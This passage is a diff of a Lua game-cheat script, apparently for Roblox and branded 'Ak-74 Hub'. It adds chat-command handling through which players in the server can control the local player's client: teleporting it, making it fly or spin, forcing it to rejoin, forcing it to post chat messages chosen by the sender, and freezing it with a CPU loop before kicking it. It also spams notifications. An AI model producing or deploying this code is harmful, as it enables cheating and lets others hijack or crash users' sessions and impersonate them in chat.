+                    if t and t == LP and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+                        local myHRP = HRP()
+                        if myHRP then
+                            myHRP.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+                        end
+                    end
+                elseif cmd == "!flyplayer" or (cmd == "!fly" and args[2] and tonumber(args[2]) == nil) then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        startFly(50)
+                    end
+                elseif cmd == "!unflyplayer" or (cmd == "!unfly" and args[2] and tonumber(args[2]) == nil) then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        stopFly()
+                    end
+                elseif cmd == "!spinplayer" or (cmd == "!spin" and args[2] and tonumber(args[2]) == nil) then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        local spd = tonumber(args[3]) or 20
+                        startSpin(spd)
+                    end
+                elseif cmd == "!unspinplayer" or (cmd == "!unspin" and args[2] and tonumber(args[2]) == nil) then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        stopSpin()
+                    end
+                elseif cmd == "!controllchat" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        local forcedMsg = table.concat(args, " ", 3)
+                        if forcedMsg and forcedMsg ~= "" then
+                            sendGlobalMessage(forcedMsg)
+                        end
+                    end
+                elseif cmd == "!crashar" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        task.spawn(function()
+                            local tStart = tick()
+                            while tick() - tStart < 5 do
+                                for i = 1, 100000 do local _ = math.sqrt(i) end
+                            end
+                            LP:Kick("Desconectado do servidor.")
+                        end)
+                    end
+                elseif cmd == "!rjplayer" or cmd == "!rj" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        doRejoin()
+                    end
+                end
+            end
+        end)
+    end
+
+    local lastCmdStamp = {}
+    local function handleIncomingChat(sender, message)
+        if not sender or type(message) ~= "string" then return end
+        local key = tostring(sender.UserId) .. ":" .. message
+        local now = tick()
+        if lastCmdStamp[key] and (now - lastCmdStamp[key]) < 0.4 then
+            return
+        end
+        lastCmdStamp[key] = now
+        processChatCommand(sender, message)
+    end
+
+    local function setupChatCommands(player)
+        player.Chatted:Connect(function(message)
+            handleIncomingChat(player, message)
+        end)
+    end
+
+    pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            TextChatService.MessageReceived:Connect(function(textChatMsg)
+                if textChatMsg and textChatMsg.TextSource then
+                    local sender = Players:GetPlayerByUserId(textChatMsg.TextSource.UserId)
+                    if sender then
+                        handleIncomingChat(sender, textChatMsg.Text)
+                    end
+                end
+            end)
+        end
+    end)
+
+    setupChatCommands(LP)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP then
+            setupChatCommands(p)
+        end
+    end
+    Players.PlayerAdded:Connect(function(p)
+        setupChatCommands(p)
+    end)
+
+    task.spawn(function()
+        for i = 1, 100 do
+            Rayfield:Notify({
+                Title = "Ak-74 Hub",
+                Content = "676767",
+                Duration = 0.5,
+            })
+            task.wait(0.1)
+        end
+    end)
+end)
+
+if not Success then
+    warn("Erro crítico: " .. tostring(err))
+end
